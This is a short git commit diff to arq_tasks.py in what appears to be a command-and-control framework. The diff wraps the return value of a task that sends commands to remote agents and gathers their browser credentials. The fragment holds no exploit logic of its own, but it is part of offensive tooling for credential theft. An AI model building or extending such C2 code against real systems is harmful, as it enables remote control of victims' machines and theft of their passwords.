145254132fdcc34da8eff4b1fb2e12755e67cb48
Aahron Chetrit <105120555+ahron-chet@users.noreply.github.com>
2025-02-24 13:36:13 +0200

    Update arq_tasks.py

--- DarkScryC2Managment/application/services/arq_tasks.py
+++ DarkScryC2Managment/application/services/arq_tasks.py
@@ -2,7 +2,7 @@ from darkscryc2server.Utils.remote_utils.commands import remote_send_command
 from darkscryc2server.Models.schemas import GenAction, CommandIdentifiers
 from darkscryc2server.Models.ModulesSchemas.Collection import CredentialType
 from darkscryc2server.Utils.ModulesUtils.webgather import gather_browser_credentials
-
+from darkscryc2server.Models.remote_tools_schemas import ManagerResponse
 async def remote_send_command_task(ctx, agent_id: str, command: str, _action_name:str):
     result = await remote_send_command(conn_id=agent_id, command=command)
     if not result.success:
@@ -16,4 +16,4 @@ async def remote_send_web_cred_gather(ctx, agent_id: str, cred_type: CredentialT
     if not result.success:
         raise Exception(result.error)
     creds = await gather_browser_credentials(result.data["result"])
-    return creds.model_dump()
+    return ManagerResponse(success=True, data=creds.model_dump()).model_dump()
